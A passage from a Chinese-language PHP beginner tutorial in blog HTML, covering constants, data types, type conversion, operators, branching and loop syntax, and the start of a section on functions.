常量名；      //注意：使用常量，前面不带”$”符号，也不能有引号</p><p><strong>使用constant()函数以取值：</strong></p><p>​        echo constant(‘常量名’);      //注意，此时常量名要用引号引起来。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527094710.png" alt="" loading="lazy"></p><h2 id="变量与常量的区别："><a href="#变量与常量的区别：" class="headerlink" title="变量与常量的区别："></a>变量与常量的区别：</h2><p>​        1. 变量的数据可以变化（重新赋值），常量不可以。</p><p>​        2. ==变量可以存储各种数据类型，而常量只能存储简单数据类型。==</p><p>​        3. 给变量赋值可以是“计算”结果，但给常量赋值，只能是“直接写出的值”（字面值）</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527094840.png" alt="" loading="lazy"></p><h2 id="判断一个常量是否存在：defined"><a href="#判断一个常量是否存在：defined" class="headerlink" title="判断一个常量是否存在：defined();"></a>判断一个常量是否存在：defined();</h2><p>​        判断的结果返回：true（表示存在）或false（表示不存在）</p><p>形式：</p><p>​        if（ defined (‘常量名’) ) {     //如果该常量名存在，则….</p><p>​                //….做什么事情。。。。</p><p>​            }</p><p>演示：</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527094955.png" alt="" loading="lazy"></p><h2 id="预定义常量"><a href="#预定义常量" class="headerlink" title="预定义常量"></a>预定义常量</h2><p>​        预定义常量就是PHP语言内部预先定义好的常量，我们可以直接使用。</p><p>​        比如：PHP_VERSION, PHP_OS, PHP_INT_MAX, M_PI等。</p><p>​        PHP_VERSION： 表示当前php的版本信息</p><p>​        PHP_OS：       表示当前php运行所在的系统信息</p><p>​        PHP_INT_MAX： 表示当前版本的php中的最大的整数值</p><p>​        M_PI：         表示圆周率π（一个有10多位小数的数）</p><p>查手册，预定义常量如下：</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527095138.png" alt="" loading="lazy"></p><h2 id="几个魔术常量"><a href="#几个魔术常量" class="headerlink" title="几个魔术常量"></a>几个魔术常量</h2><p><strong>含义：</strong></p><p>​        魔术常量也是常量，只是在形式上为常量，而其值其实是“变化”的。</p><p>他们也是系统中预先定义好的，也就几个，下面是最常用的 3个：</p><p><strong>_<em>DIR_</em></strong>         ：代表当前php网页文件所在的目录</p><p>*<em>_<em>FILE_</em> *</em>      ：代表当前php网页文件本身的路径</p><p><strong>_<em>LINE_</em></strong>,     ：代表当前这个常量所在的行号</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527095443.png" alt="" loading="lazy"></p><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="数据类型分类与概述"><a href="#数据类型分类与概述" class="headerlink" title="数据类型分类与概述"></a>数据类型分类与概述</h2><p><strong>==标量类型==</strong></p><p>​        标量类型也可以理解为“基本类型”，“简单类型”。</p><p>​        标量类型包括如下4种：</p><p>​        字符串类型：String</p><p>​                就是一串字符串，当做一个整体，表示一个连续有确定顺序的字符串。</p><p>​                通常需要使用单引号或双引号来引起来，比如：</p><p>​                $name = “张三”;</p><p>​        整数类型：Int， Integer</p><p>​        浮点数： Float， Double</p><p>​        就是数学上的小数。</p><p>​        布尔类型： Bool， Boolean</p><p>​                这种数据类型只有两个数据：true， false</p><p>​                $is_graduate = true;</p><p>​                $hasMoney = false;</p><p><strong>复合类型</strong></p><p>​        就是“数组”（Array）和“对象”（Object）两种。</p><p><strong>特殊类型</strong></p><p>​        空类型： 有且只有一个数据可以使用，那就是null</p><h2 id="整型integer，int"><a href="#整型integer，int" class="headerlink" title="整型integer，int"></a>整型integer，int</h2><p>可以有4种直接书写的形式：</p><p>​        10进制形式：</p><p>​                $n1 = 123;</p><p>​        8进制形式：</p><p>​                $n1 = 0123;      ==//以0开头==</p><p>​        16进制形式：</p><p>​                $n1 = 0x12A34;  ==//以0x开头，还可以有A，B，C，D，E，F这个6个“16进制数字”==     </p><p>​        2进制形式：</p><p>​                $n1 = 0b1011011010;   ==//以0b开头==</p><p>下表为进制对比：        </p><table><thead><tr><th>10  进制</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th><th>12</th><th>13</th><th>14</th><th>15</th><th>16</th></tr></thead><tbody><tr><td>8  进制</td><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td>10</td><td>11</td><td>12</td><td>13</td><td>14</td><td>15</td><td>16</td><td>17</td><td>20</td></tr><tr><td>16  进制</td><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td>8</td><td>9</td><td>A</td><td>B</td><td>C</td><td>D</td><td>E</td><td>F</td><td>10</td></tr><tr><td>2进制</td><td>0</td><td>1</td><td>10</td><td>11</td><td>100</td><td>101</td><td>110</td><td>111</td><td>1000</td><td>1001</td><td>1010</td><td>1011</td><td>1100</td><td>1101</td><td>1110</td><td>1111</td><td>10000</td></tr></tbody></table><p><strong>进制的相互转换</strong></p><p>直接通过系统函数来进行，能完成：</p><p>10进制转为2, 8, 16进制：</p><p>​        decbin()：将10进制转为2进制</p><p>​        decoct()：将10进制转为8进制</p><p>​        dechex()：将10进制转为16进制</p><p>或：</p><p>2, 8, 16进制转为10进制：</p><p>​        bindec()：将2进制数字字符串转为10进制</p><p>​        octdec()：将8进制数字字符串转为10进制</p><p>​        hexdec()：将16进制数字字符串转为10进制</p><h2 id="浮点型float"><a href="#浮点型float" class="headerlink" title="浮点型float"></a>浮点型float</h2><p>浮点数就是相当于数学上的“小数”</p><p>两种书写形式：</p><p>​        直接小数点形式：</p><p>​                $f1 = 0.1;     //或者1.23;  123.0;</p><p>​        科学计数法</p><p>​                $f2 = 1.23e3;    ==//表示1.23 乘以10的3次方==</p><p>​                $f3 = 123e2;      ==//这个也是浮点数，虽然其结果值是一个“整数”（12300==</p><p>==<strong>特别注意：浮点数不要做相等比较（==）</strong>：因为浮点数进行相等比较，是“不可靠”的:==</p><p>​        $v1 = 0.1 + 0.2;</p><p>​        $v2 = 0.3;</p><p>​        问：$v1和$v2相等吗？</p><h2 id="布尔型Boolean"><a href="#布尔型Boolean" class="headerlink" title="布尔型Boolean"></a>布尔型Boolean</h2><p>只有两个数据值： true， false（不区分大小写）</p><p>在需要当做“布尔值”进行判断或比较的时候，以下数据会被当作布尔值的 false：</p><p>​        ==false, 0, 0.0, “”,  null, ‘0’, 空数组==</p><p>其余都被当做布尔值的 true。</p><p>常见应用代码类似这样：</p><p>​        $v1 = 某某值; </p><p>​        if( $v1 ) { //此时，如果$v1为上述值之一，就会当做false，不执行其中的代码。</p><p>​        。。。代码。。。</p><p>​        }</p><p>​        //而对于其他值，就会当做true，因此就会执行其中的代码。</p><h2 id="字符串型String"><a href="#字符串型String" class="headerlink" title="字符串型String"></a>字符串型String</h2><p>可以使用单引号或双引号来表示（引起来）。</p><p>表示一串“连续的字符”，最短的字符串是“空字符串”，比如： $str1 = “”。</p><p>​        ==注意：这个不是空字符串： “  ”， 因为其中包括了1个空格字符。==</p><p>$name = “张三”;</p><p>$edu = ‘北京大学’;</p><p>$title = “关于微信应用的几个改进建议”；    //文章标题</p><p>$v1 = ‘’;     //这也是字符串（空字符串）</p><p>$v2 = ‘123’;      //这还是字符串</p><p>$v3 = “false”;     //这仍然是字符串</p><p>特别注意：</p><p>​        ==双引号字符串中，如果出现“$”符号，则该符号后的连续字符（单词）会被识别为一个变量名。==</p><p>​        ==如果识别成功（即确实存在该变量），则会将该变量转换为实际内容。==</p><p>​        ==如果识别失败（即实际没有该变量），则会报错。==</p><h2 id="数组类型Array"><a href="#数组类型Array" class="headerlink" title="数组类型Array"></a>数组类型Array</h2><p>​    </p><p>数组，就是将多个“数据”放在一起，排成一个序列，这个序列作为一个整体（里面包括了多个数据），就称为“数组”。比如：</p><p>​        $arr1 = array(‘张三丰’, 18, “男” );</p><p>​        或另一种形式：</p><p>​        $arr2 = array(‘name’ =&gt; ‘张三丰’, ‘age’=&gt;18, ‘gender’ =&gt; “男” );</p><p>数组的赋值：</p><p>​        $数组变量[下标] = 一个值；</p><p>数组的取值：</p><p>​        行为为：$数组变量[下标]</p><p>​        比如： echo $arr1[0];     print_r( $arr2[‘name’] )；</p><p>其内部结构，可以这样去理解：</p><p>$info内部结构：</p><table><thead><tr><th>键名/下标/索引</th><th>0</th><th>1</th><th>2</th></tr></thead><tbody><tr><td>值</td><td>‘张三丰’</td><td>18</td><td>‘男’</td></tr></tbody></table><p>这种下标，通常称为“数字下标”。</p><p>$info2内部结构：</p><table><thead><tr><th>键名/下标/索引</th><th>‘name’</th><th>‘age’</th><th>‘gender’</th></tr></thead><tbody><tr><td>值</td><td>‘张三丰’</td><td>18</td><td>‘男’</td></tr></tbody></table><p>这种下标，通常被称为“字符串下标”。</p><h2 id="空类型NULL"><a href="#空类型NULL" class="headerlink" title="空类型NULL"></a>空类型NULL</h2><p>只有一个值： null（不区分大小写）。</p><p>$v1 = null;   //此时，具有变量$v1,但其中的数据是“空的”（没有数据）</p><p>==空值变量，isset()判断的结果是false（即不存在）。==</p><h2 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h2><p>==gettype()==： 获取一个变量的类型，结果为一个变量类型的名称（字符串）</p><p>​        $v1 = 10;</p><p>​        $r1 = gettype( $v1 );   //结果为：“integer”</p><p>​        $v2 = ‘abc’;</p><p>​        $r2 = gettype( $v2 );   //结果为：“string”</p><p>==settype()==： 设置一个变量的类型</p><p>​        $v1 = 10;     //此时，$v1中数据是整数类型</p><p>​        settype( $v1, ‘string’); //此时，$v1是字符串类型，即其中的数据变成了：“10”</p><p>var_dump()： 输出变量的“完整信息”，包括变量类型，长度（如果需要），内容</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527145758.png" alt="" loading="lazy"></p><p>==判断是否为某种类型（类型系列函数）==： </p><p>​        is_int() / is_integer()：判断是否为整数类型</p><p>​        is_float()：判断是否为浮点类型</p><p>​        is_bool()：判断是否为布尔类型</p><p>​        is_string()：。。。</p><p>​        is_array()：。。。</p><p>​        is_numeric()：判断是否为“数字”类型（含整数，小数，以及“纯数字字符串”）</p><p>​        is_object()：</p><p>两个特殊判断：</p><p>​        ==isset()： 判断一个变量中是否有数据，如果有返回true，如果没有(即此时就是null)返回false==</p><p>​        ==empty()：判断是否为“空的”。如果确实是“空的”，返回true，否则返回false。==</p><p>​                “空的”的意思，比较接近日常生活中的“没有”。</p><p>​                而空（null）是一个计算机中的特殊概念，表示“完全不存在”，可以理解为“真空”。</p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p><strong>自动转换</strong></p><p>我们无需做任何处理，而是，==程序会根据运算时运算符所需要的数据类型进行转换。==</p><p>如果参与运算的数据不是需要的类型，则会自动转换为需要的数据类型。</p><p>$v1 = 1 + “3”; //结果是4；</p><p>$v2 = 1 . “3”;  //“.”是字符串连接符，这里，1会被转换为字符串，结果是：“13”</p><p>典型自动转换：</p><p>​        转换为数字：</p><p>​            1+”2”           //</p><p>​            “1” + “2”         //</p><p>​            1 + ”2abc”       //</p><p>​            1 + ”2abc34”      //</p><p>​            1 + “abc”         //</p><p>​            1 + “abc2”       //</p><p>​            1.2 + “2”         //</p><p>​            1.2 + “2.2abc”     //</p><p>​            1.2 + “abc2.2”     //</p><p>​            “1.2abc” + 2      //</p><p>​            “1.2abc” + “2abc”  //</p><p>​        转换为整数：</p><p>​            10.8 % 3.6</p><p>​            “10.8” % “3.6”</p><p>​            “10.8” % “3.6abc”</p><p>​            “10.8ab” % “3.6cd”</p><p><strong>强制转换:</strong></p><p>人为使用强转换语法进行转换，比如：\</p><p>​        $v1 = (int) “1”;   //结果，$v1是整数类型的1</p><p>​        $v2 = (float) “1.23”;  //结果，$v2是浮点类型的1.23</p><p>​        $v3 = (string) $v1; //结果，$v3是字符串“1”</p><h1 id="运算符详解"><a href="#运算符详解" class="headerlink" title="运算符详解"></a>运算符详解</h1><p><strong>含义；</strong></p><p>​        就是对数据进行某种所需要的运算的语法符号，比如加减乘除，或比较大小，或判断真假。</p><p><strong>按参与运算的数据的个数来分类</strong></p><p>单目运算符：</p><p>​        只需要一个数据——但必须是变量。</p><p>双目运算符：</p><p>​        需要两个数据——可以是变量，也可以直接的数据本身。</p><p>三元运算符：</p><p>​        需要3个数据才能运算，也称为三目运算符。</p><p>​        只有一个三元运算符。</p><p><strong>按功能分类</strong></p><p>​        赋值运算符：</p><p>​        = </p><p>​        算术运算符：</p><p>​        + - * / %</p><p>​        连接运算符：</p><p>​        .</p><p>​        自赋值运算符：</p><p>​        +=  -=  *=  /=  %=  .=</p><p>​        自操作运算符：</p><p>​            ++  –</p><p>​        比较运算符：</p><p>​            &gt;  &gt;=  &lt;  &lt;= == !=  ===  !==</p><p>​        逻辑运算符：</p><p>​            &amp;&amp;(与）  ||（或）  ！（非）</p><p>​        条件运算符：</p><p>​            数据1 ? 数据2  : 数据3</p><p>​        位运算符：</p><p>​            &amp;  |  ~ </p><p>​        其他：</p><p>​            @，是错误抑制符</p><p>​            ( )，括号，用于提升运算优先级，括号中的先运算。</p><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><p>只要理解一个核心的观念：</p><p>​        ==就是将等号（=）右边的数据（可能是运算结果数据）赋值给左边的变量。==</p><p>​        看看一下写法：</p><p>​        $v1 = 1;</p><p>​        $v2 = 2;</p><p>​        $v3 = $v1 + $v2;</p><p>​        $v1 + $v2 = $v3;  //可以吗？不可以！</p><p>​        if( $v1 + $v2 = $v3 ){….} //可以吗？？？还是不可以！</p><p>​        ==一定记住，一个等号的左边，只能是一个“变量名”！==</p><p>​        ==所以，这个写法是错误的：  $v1+2 = $v2 + 3==</p><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>针对数字进行的算术计算，包括：+ - * / %</p><p>%：对整数数字进行“==取余操作==”——如果不是整数，会先自动转换为整数之后再进行取余。</p><p>​                                                             转换为整数的做法是：直接去掉小数部分</p><p>比如：</p><p>​        $v1 = 10 % 3;  //结果为1</p><p>​        $v2 = 10.8 % 3.6  //结果为1</p><h2 id="连接运算符"><a href="#连接运算符" class="headerlink" title="连接运算符( . )"></a>连接运算符( . )</h2><p>就是字符串的连接，能够将前后字符连接起来。</p><p>如果不是字符串，会自动转换为字符串。</p><p>$v1 = “ab” . “cd”;</p><p>$v2 = $v1 . “ef”;</p><p>$v3 = “ab” . 12;       //“ab12”</p><p>$v4 = 12 . 34;      //”1234”</p><p>$v5 = “12” . true;   //“121”，true转为字符串，为“1”；</p><p>$v6 = “12” . false;  //“12”，false转为字符串，为“”（即空字符串）；</p><h2 id="自赋值运算符"><a href="#自赋值运算符" class="headerlink" title="自赋值运算符"></a>自赋值运算符</h2><p>针对数字的，包括： +=  -=  *=  /=  %= </p><p>针对字符串的，只有一个：.=</p><p>形式：</p><p>​        ==$变量 += 数据；==</p><p>​        相当于这个赋值语句： ==$变量 = $变量 + 数据；==</p><p>​        此时，其实是相当于该变量的值，跟给定的数据进行运算后的结果数据，再放回到该变量中（覆盖了之前的数据）。</p><h2 id="自操作-自加自减）运算符"><a href="#自操作-自加自减）运算符" class="headerlink" title="自操作(自加自减）运算符"></a>自操作(自加自减）运算符</h2><p>针对整数，只有2个：++  –  </p><p>属于单目运算符，即只要一个变量就可以进行运算。</p><p>形式：</p><p>​        $变量++；   //对该变量中数据+1</p><p>​        $变量–；   //对该变量中数据-1</p><p>​        ++$变量；   //对该变量中数据+1</p><p>​        –$变量；   //对该变量中数据-1</p><p>++讨论：</p><p>​        表示对该变量进行“自加1”操作。即该变量中的数据加1。</p><p>​        前自加：</p><p>​        后自加：</p><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>含义：</p><p>​        是针对数字的大小进行比较的运算。</p><p>​        如果不是数字，会自动转换为数字。</p><p>​        包括：  &gt;  &gt;=  &lt;  &lt;=  == !=  ===  !==</p><p>​        所有比较运算符，运算的结果只有两个可能（之一）： true 或 false</p><p>​        比如：</p><p>​        if( 1 == 2);       //结果是false</p><p>等于（==）和全等于（===）的区别：</p><p>通常，等于（==）也会用“模糊相等”或“松散比较”的说法。</p><p>两个数据“基本相等”（类型可能会发生自动转换），就算是相等。</p><p>全等于（===）就是完全相等：</p><p>只有两个数据的数据类型一样，并且其值也一样的时候，才是全等。</p><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>针对“布尔值”进行的运算，只有3个： </p><p>​        与：    &amp;&amp;  </p><p>​        或：    ||  </p><p>​        非：    ！</p><p>如果不是布尔值，会自动转换为布尔值去进行运算。</p><p>因为布尔值只有2个，不管怎么排列组合，最终只有以下10种情况的计算，几乎就是公式化。</p><p><strong>逻辑与（&amp;&amp;）：</strong></p><p>含义：</p><p>​        表示两个条件（数据）的真假结果是否同时为真的共同作用结果。</p><p>​        运算结果：只有两个条件都为真的时候，结果才是真（true）。</p><p>只有如下4种情况：</p><p>​        true &amp;&amp; true      结果为 true</p><p>​        true &amp;&amp; false     结果为 false</p><p>​        false &amp;&amp; true      结果为 false</p><p>​        false &amp;&amp;false     结果为 false</p><p><strong>逻辑或（||）：</strong></p><p>含义：</p><p>​        表示两个条件（数据）的真假结果的是否存在“真”的情况的共同作用结果。</p><p>运算规则：</p><p>​        只要有任意一个条件为真（true），结果就是真。</p><p>只有如下4种情况：</p><p>​        true || true    结果为 true</p><p>​        true || false   结果为true</p><p>​        false || true   结果为 true</p><p>​        false ||false   结果为 false</p><p><strong>逻辑非（！）：</strong></p><p>就是对一个布尔值进行“取反”操作，规则为：</p><p>​        !true   结果为false</p><p>​        !false   结果为true</p><p>逻辑非（！）在if中的常见应用情形：</p><p>​        if( !isset( $v1 ) ){….}   //如果$v1为空（null）</p><p>​        if( !empty( $v1 ) ){…}     //如果$v1不为空（empty）</p><p>​        对应的两个相反的情形是：</p><p>​        if( isset( $v1 ) ){….}     //如果$v1存在</p><p>​        if( empty( $v1 ) ){…}     //如果$v1为空（empty）</p><p>区分两个“空”：</p><p>​        null：   “真空”，什么都没有，是明确定义的“没有数据”的一种写法（含义）</p><p>​        empty：“现实意义上的没有”，就是无，就是0,等等，常见的，认为是empty的数据有：</p><p>​                        ==“”（空字符串）, 0, 0.0, “0”, false, null, 空数组，==</p><p><strong>逻辑运算的短路规则：</strong></p><p>短路：</p><p>​        就是对于“逻辑与” 或 “逻辑或”这两种运算符，他们可能会只进行左侧的逻辑判断之后，立即就中断后续（右侧）的判断，而得出整个逻辑运算符的运算结果！</p><p>​        if ( 左侧判断 &amp;&amp; 右侧判断 )</p><p>​        if ( 左侧判断 || 右侧判断 )</p><p>举例：</p><p>​        判断一个整数（比如13）是否能被3整除并且能被5整除！</p><p><strong>结论：</strong></p><p>我们应该将我们可能发生短路运算的逻辑判断的前后判断语句，做如下调整：</p><p>​        相对简单的运算放前面（左侧），相对复杂的运算放后面（右侧）。</p><p>对于逻辑或的短路运算，道理一样。</p><h2 id="条件运算符"><a href="#条件运算符" class="headerlink" title="条件运算符"></a>条件运算符</h2><p>​        </p><p>只有一个条件运算符，形式为：</p><p>​        表达式1 ？ 表达式2 ：表达式3</p><p><strong>含义：</strong></p><p>​        如果表达式1为true（或自动转换后为true），则运算的结果值为表达式2，否则为表达式3。</p><p><strong>举例：</strong></p><p>​        $score = 77;  //分数</p><p>​        $v1 = $score &gt;= 60 ? “及格” ： “不及格”；</p><p>其本质是：</p><p>​        $score = 77;  //分数</p><p>​        if ( $score &gt;= 60 ){</p><p>​            $v1 = “及格”；</p><p>​        }</p><p>​        else{</p><p>​            $v1 = “不及格”；</p><p>​        }</p><h2 id="位运算符（了解）"><a href="#位运算符（了解）" class="headerlink" title="位运算符（了解）"></a>位运算符（了解）</h2><p>​        针对整数进行的二进制级别的运算。</p><p>​        基本位运算符包括：按位与（ &amp; ）， 按位或（ | ）， 按位非（ ~ ）， 按位异或（^）</p><p><strong>位运算基本运算规则：</strong></p><p>位运算符有如下基本运算规则：</p><p>​    （只针对二进制的0和1这两个数据的基本位运算规则）：</p><p>按位与（&amp;）运算规则：</p><p>​        0 &amp; 1 结果为：0</p><p>​        0 &amp; 0 结果为：0</p><p>​        1 &amp; 0 结果为：0</p><p>​        1 &amp; 1 结果为：1</p><p>​        ==结论：只有两个都是1，按位与运算结果才是1==</p><p>按位或（|）运算规则：</p><p>​        0 | 1 结果为：1</p><p>​        0 | 0 结果为：0</p><p>​        1 | 0 结果为：1</p><p>​        1 | 1 结果为：1</p><p>​        ==结论：只有两个都是0，按位或运算结果才是0==</p><p>按位非（~）：</p><p>​        ~1结果为0</p><p>​        ~0结果为1</p><p>按位异或（^）：</p><p>​        0 ^ 1 结果为：1</p><p>​        0 ^ 0 结果为：0</p><p>​        1 ^ 0 结果为：1</p><p>​        1 ^ 1 结果为：0</p><p>​        ==规则是：相同为0，不同为1==</p><h2 id="错误抑制符"><a href="#错误抑制符" class="headerlink" title="==错误抑制符@=="></a>==错误抑制符@==</h2><p>含义：</p><p>​        在一个表达式出现错误的时候，可以将错误“隐藏”（掩盖）起来（不输出）！</p><p>通常，该符号，用于在实际运行环境中的一些条件非我们（程序员）所能控制的情形。</p><p>如果出现该情形并报错，则我们可以抑制该错误的显示（只是该错误不显示，不是没有错误了）。</p><p>典型应用场景：</p><p>​        if( @mysqli_connect(‘localhost’, ‘root’, ‘123’ ) ){</p><p>​        …….</p><p>​        }</p><h2 id="运算符的优先级"><a href="#运算符的优先级" class="headerlink" title="运算符的优先级"></a>运算符的优先级</h2><p>运算符优先级不得不说的规则：</p><ol><li><p>时刻意识到，运算符有优先级问题！</p></li><li><p>小括号可以改变运算的顺序（即括号最优先）</p></li><li><p>先乘除（以及取余）后加减；</p></li><li><p>大致有如此优先级规则：算术运算 &gt; 比较运算 &gt; 逻辑运算</p></li><li><p>赋值运算符通常都是最后（优先级最低）</p></li></ol><h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><h2 id="流程控制概述"><a href="#流程控制概述" class="headerlink" title="流程控制概述"></a>流程控制概述</h2><p>顺序结构：</p><p>​        程序运行的自然状态，就是从前往后（从上到下）运行程序。</p><p>分支结构：</p><p>​        程序运行过程中，根据判断条件的不同结果(true或false)，执行不同的分支（其他分支不再执行）。</p><p>循环结构：</p><p>​        程序运行过程中，根据判断条件的不同结果(true或false)，决定是再次执行还是不再执行。</p><h2 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h2><p><strong>单分支</strong></p><p>​        形式：</p><p>​            if ( 条件判断 ）{</p><p>​                    //如果条件满足，就执行这里</p><p>​            }</p><p><strong>双分支</strong></p><p>​        形式：</p><p>​            if ( 条件判断 ）{</p><p>​                    //如果条件满足，就执行这里</p><p>​            }</p><p>​            else{</p><p>​                    //如果条件不满足，就执行这里</p><p>​                }</p><p><strong>多分枝</strong></p><p>​        形式：</p><p>​                if ( 条件判断1 ）{</p><p>​                        //分支1；</p><p>​                    }</p><p>​                elseif( 条件判断2 ）{</p><p>​                    //分支2；</p><p>​                    }</p><p>​                    elseif( 条件判断3 ）{</p><p>​                        //分支3；</p><p>​                    }</p><p>​                            。。。。。。。前面的elseif分支，可以若干个（0个以上）</p><p>​                    else{</p><p>​                //最后的else分支，可以没有！</p><p>​                        }</p><h2 id="分支结构之switch分支语句（重点）"><a href="#分支结构之switch分支语句（重点）" class="headerlink" title="分支结构之switch分支语句（重点）"></a>分支结构之switch分支语句（重点）</h2><p><strong>语法：</strong></p><p>​        switch（ 一个变量数据或表达式结果$v1 ）{</p><p>​                case 值1：         //如果$v1 等于 这个“值1”，就执行本分支</p><p>​                        分支语句1；</p><p>​                        break；          //表示跳出该分支，也就是跳出switch语句。</p><p>​                case 值2：         //如果$v1 等于 这个“值2”，就执行本分支</p><p>​                        分支语句2；</p><p>​                        break；</p><p>​                    。。。。。。     //可以更多的分支</p><p>​                default：</p><p>​                        默认分支；      //前面都不满足的时候，就执行这里</p><p>​                }</p><p><strong>说明：</strong></p><p>​        1. 上述“值1，值2，。。。”可以是各种标量类型，也可以是表达式——因为最终它也是一个值。</p><p>​        2. 用于进行测试的数据变量$v1跟后续的各个值，只能进行“相等比较”（==）。</p><p>​        3. 从上述第2条角度来说，其实际上不如if灵活。</p><p><strong>注意：</strong></p><p>​        当某个分支满足条件并执行该分支后，如果该分支中没有break语句，此时，程序的流程会“直接进入”后一个分支继续执行，直到碰到break才会结束switch。</p><h2 id="循环结构之while循环语句"><a href="#循环结构之while循环语句" class="headerlink" title="循环结构之while循环语句"></a>循环结构之while循环语句</h2><p>while循环语法：</p><p>​        while（条件判断）{</p><p>​            。。。。循环体语句；</p><p>​        }</p><p>说明：</p><p>​        循环一开始就进行条件判断：</p><p>​                如果成立：则执行循环体，而后会自动回到循环开始位置继续进行条件判断，如此反复；</p><p>​                如果不成立：则退出循环，执行后续语句。</p><h2 id="循环结构之do-while循环语句"><a href="#循环结构之do-while循环语句" class="headerlink" title="循环结构之do while循环语句"></a>循环结构之do while循环语句</h2><p><strong>do while循环语法：</strong></p><p>​        do {</p><p>​            。。。。循环体语句；</p><p>​            }while（条件判断）；</p><p><strong>说明：</strong></p><p>​        ==-先执行一次循环体，然后进行条件判断：==</p><p>​                如果成立：则继续回去执行循环体，而后再次进行条件判断，如此反复；</p><p>​                如果不成立：则退出循环，执行后续语句。</p><h2 id="循环结构之for循环语句（重点-难点"><a href="#循环结构之for循环语句（重点-难点" class="headerlink" title="==循环结构之for循环语句（重点/难点)=="></a>==循环结构之for循环语句（重点/难点)==</h2><p><strong>for循环语法：</strong></p><p>​        for（循环变量初始化1； 循环条件判断2； 循环变量的改变3）{</p><p>​                。。。。。。。。循环体语句块4；</p><p>​                //这里可以有多条语句</p><p>​                //是可以反复执行的部分</p><p>​            }</p><p><strong>说明：</strong></p><p>​        1. 执行流程如下图所示</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527154450.png" alt="" loading="lazy"></p><p>​        2. 此语句结构是将循环的3个要素都集中在一起写的形式，比较紧凑，容易控制，最常用。</p><p>​        3. 循环变量初始化语句1只执行一次，所以真正的正常循环，是在“2-&gt;4-&gt;3”之间进行</p><h2 id="多重循环及案例"><a href="#多重循环及案例" class="headerlink" title="多重循环及案例"></a>多重循环及案例</h2><p><strong>概念：</strong></p><p>​        多重循环就是循环里面由出现循环的代码。</p><p>​        其基本执行流程，其实仍然是循环的基本逻辑，只是循环的时候要注意：外层循环执行每一次，里层循环就会完整执行循环的“所有次”（一个完整循环的过程）。</p><h2 id="循环的中断"><a href="#循环的中断" class="headerlink" title="循环的中断"></a>循环的中断</h2><p>​        循环是按给定的条件，只要条件满足就会继续执行循环体的一种语法形式。</p><p>但，我们也可以在循环过程中（循环体内），人为将循环中断</p><p>有两种中断循环的方式：</p><p><strong>continue中断：</strong></p><p>​        含义：中断当前正在进行的循环体（即后续语句不再执行），继续下一次循环要执行的语句。</p><p>​        语法形式：</p><p>​                continue [$n]；      //表示是要中断第几层的循环，继续该层循环的下一次。</p><p>​                                                //其中$n可以省略，如果省略，表示1，就是中断当前层的循环。</p><p><strong>break中断：</strong></p><p>​            含义：停止（跳出）当前正在进行的循环（即完全终止循环），去执行该循环之后的语句。</p><p>​            语法形式：</p><p>​                    break [$n]；         //表示是要中断几层循环。</p><p>​                                                    //其中$n可以省略，如果省略，表示1，就是中断当前循环</p><p>​            他们都适用于3种循环。</p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="函数的概念与作用"><a href="#函数的概念与作用" class="headerlink" title="函数的概念与作用"></a>函数的概念与作用</h2><p>函数不是数！</p><p>函数是一种代码形式（语法形式）。</p><p>函数是将“若干行代码”以一种语法形式包装成的一个整体。</p><p>该整体可以做到“需要的时候就去执行它”（就是执行其中的若干行代码）。</p><p>函数是解决在不同情形（不同代码位置）下需要执行相同代码的有效方式——即所谓<strong>代码重用</strong>。</p><p>函数通常用于“专业的事由专业的人来做”这种现实世界的常见现象。</p><p>​                比如油条摊：专门做油条，顾客随时需要，就随时可以买（付钱就可以）。</p><p>​                比如轮胎厂：专门生产不同型号轮胎，汽车制造厂随时需要就随时提供（付钱）。</p><p>​                比如豆浆机：专门制作豆浆，人们随时需要豆浆就随时可以启动豆浆机制作豆浆（提供豆子和水）。</p><h2 id="函数的定义与调用"><a href="#函数的定义与调用" class="headerlink" title="函数的定义与调用"></a>函数的定义与调用</h2><p><strong>定义语法形式：</strong></p><p>​        function  函数名（$形参1，$形参2， …… ）{ //形参，就是形式参数，是变量</p><p>​                函数体语句块；  //就是若干行代码</p><p>}</p><p><strong>调用语法形式：</strong></p><p>​        函数名（$实参1，$实参2， …… ）；   //实参就是实际参数，是数据</p><p><strong>说明</strong>：</p><ol><li><p>函数名的命名规则，跟变量名一样；</p></li><li><p>定义函数的目的就是为了以后能够调用；</p></li><li><p>调用函数，其实就是执行函数中代码；</p></li><li><p>形参，其实就是变量，是只能在该函数内部使用的变量；</p></li><li><p>实参，其实就是数据，是会传入函数内部的数据（==是一一对应地赋值给形参变量==）；</p></li></ol><h2 id="函数执行原理（重点-难点）"><a href="#函数执行原理（重点-难点）" class="headerlink" title="==函数执行原理（重点/难点）=="></a>==函数执行原理（重点/难点）==</h2><p>程序总是运行在一个“内存空间”。</p><p>程序开始执行的位置所在的空间，可以称之为“<strong>主运行空间</strong>”。</p><p>实际上，通常函数外面的那些程序，都是运行在主空间中。</p><p>那么，函数的运行，就相对独立了——==每个函数的每次调用，都是运行在单独的一个自己的空间中==。</p><p>如下所示：</p><p><img 